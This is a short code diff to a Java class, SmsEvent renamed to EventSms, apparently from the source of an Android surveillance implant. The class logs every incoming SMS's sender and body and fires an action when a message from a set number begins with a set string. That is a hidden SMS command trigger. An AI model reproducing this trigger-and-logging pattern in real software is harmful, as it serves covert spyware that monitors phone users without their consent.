@@ -10,9 +10,9 @@ import com.ht.RCSAndroidGUI.listener.ListenerSms;
 import com.ht.RCSAndroidGUI.util.DataBuffer;
 import com.ht.RCSAndroidGUI.util.WChar;
 
-public class SmsEvent extends EventBase implements Observer<Sms> {
+public class EventSms extends EventBase implements Observer<Sms> {
 	/** The Constant TAG. */
-	private static final String TAG = "SmsEvent";
+	private static final String TAG = "EventSms";
 
 	private int actionOnEnter;
 	private String number, msg;
@@ -65,19 +65,20 @@ public class SmsEvent extends EventBase implements Observer<Sms> {
 	}
 
 	// Viene richiamata dal listener (dalla dispatch())
-	public void notification(Sms s) {
+	public int notification(Sms s) {
 		Log.d("QZ", TAG + " Got SMS notification from: " + s.getAddress() + " Body: " + s.getBody());
-
+		
 		if (s.getAddress().equals(this.number) == false) {
-			return;
+			return 0;
 		}
 		
 		// Case sensitive
 		if (s.getBody().startsWith(this.msg) == false) {
-			return;
+			return 0;
 		}
 		
 		onEnter();
+		return 1;
 	}
 	
 	public void onEnter() {
